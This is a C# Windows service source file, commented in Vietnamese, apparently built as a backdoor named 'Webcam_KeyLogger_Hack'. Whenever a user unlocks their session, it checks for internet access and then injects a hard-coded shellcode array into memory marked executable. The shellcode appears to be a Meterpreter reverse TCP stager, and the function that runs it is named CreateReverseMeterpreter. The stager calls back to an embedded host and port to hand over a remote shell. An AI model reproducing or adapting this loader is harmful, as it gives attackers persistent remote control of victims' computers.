﻿using System;
using System.ServiceProcess;
using System.Timers;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Webcam_KeyLogger_Hack
{
    public partial class Service1 : ServiceBase
    {

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
           UInt32 lpThreadAttributes,
           UInt32 dwStackSize,
           UInt32 lpStartAddress,
           IntPtr param,
           UInt32 dwCreationFlags,
           ref UInt32 lpThreadId
         );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();

        System.Threading.Thread thread;

        static StreamWriter strmw;

        public Service1()
        {
            InitializeComponent();
            CanHandleSessionChangeEvent = true;
        }

        protected override void OnStart(string[] args)
        {
           

        }

        protected override void OnSessionChange(SessionChangeDescription changeDescription)
        {
            // SessionUnlock: Bước cuối cùng để thực hiện đăng nhập sau khi Lock hoặc Shutdown
            // SessionLogon: // Bước cuối cùng để thực hiện đăng nhập sau khi Sign out
            if (changeDescription.Reason == SessionChangeReason.SessionUnlock && changeDescription.Reason != SessionChangeReason.SessionLogon)
            {
                // Gọi hàm tạo Reverse Shell trong luồng xử lí mới
                // trước khi thực hiện khởi tạo, giả định cần phải có kết nối internet do đó thực hiện kiểm tra
                if (CheckNetConnection())
                {
                    thread = new System.Threading.Thread(CreateReverseMeterpreter);

                    thread.Start();
                }
            }
        }

        protected override void OnStop()
        {
            // Ngắt luồng xử lí
            thread.Abort();
        }

        protected bool CheckNetConnection()
        {
            // xác định uri trang web cần truy cập
            string url = @"http://www.google.com";

            // nếu thuận lợi truy cập web thành công -> trả về true
            // nếu không thể truy cập trang web (web server chắc chắn alive), xảy ra exception -> trả về false
            try
            {
                // dùng using để dọn dẹp đôi tượng khởi tạo dù có xảy ra exception
                using (WebClient wb = new WebClient())
                // thực hiện kết nối - đọc resource của web page từ url chỉ định
                using (wb.OpenRead(url))
                    return true;

            }
            catch (Exception ex)
            {
                return false;
            }
        }

        protected void CreateReverseMeterpreter()
        {

            byte[] shellcode = new byte[] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52
,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b
,0x52,0x20,0x56,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a
,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41
,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48
,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b
,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48
,0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48
,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1
,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45
,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b
,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01
,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48
,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9
,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00
,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5
,0x49,0xbc,0x02,0x00,0x1e,0x61,0xc0,0xa8,0x6f,0x81,0x41,0x54,0x49,0x89,0xe4
,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68
,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a
,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89
,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5
,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba
,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5
,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9
,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5
,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41
,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41
,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31
,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8
,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40
,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5
,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c
,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41
,0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff
,0xd5};

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        protected void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strbOutput = new StringBuilder();
            // kiểm tra dữ liệu output và error của tiến trình
            // được ghi vào luồng đầu ra và truy xuất thông qua biến e.Data
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strbOutput.Append(e.Data);
                    // ghi dữ liệu nhận được từ tiến trình vào luồng giao tiếp
                    strmw.WriteLine(strbOutput);
                    // xóa bộ đệm của luồng dữ liệu
                    strmw.Flush();
                }
                catch(Exception ex) 
                { 
                    //
                }
            }
        }

    }
}